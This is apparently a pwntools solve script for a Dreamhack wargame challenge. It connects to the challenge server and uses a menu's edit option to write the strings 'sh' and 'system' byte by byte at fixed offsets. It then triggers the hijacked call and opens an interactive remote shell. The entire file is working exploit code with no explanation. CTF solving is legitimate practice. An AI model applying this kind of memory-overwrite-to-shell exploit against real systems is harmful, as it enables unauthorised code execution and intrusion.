#!/usr/bin/env python3

from pwn import *

r = remote("host3.dreamhack.games", 18167)

offset1 = 8196
str1 = [115, 104, 0]
for i in range(3):
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b": ", str(offset1 + i).encode())
    r.sendlineafter(b": ", b"y")
    r.sendlineafter(b": ", str(str1[i]).encode())

offset2 = 1170
str2 = [115, 121, 115, 116, 101, 109]
for i in range(6):
    r.sendlineafter(b">> ", b"3")
    r.sendlineafter(b": ", str(offset2 + i).encode())
    r.sendlineafter(b": ", b"y")
    r.sendlineafter(b": ", str(str2[i]).encode())

r.sendlineafter(b">>", b"4")

r.interactive()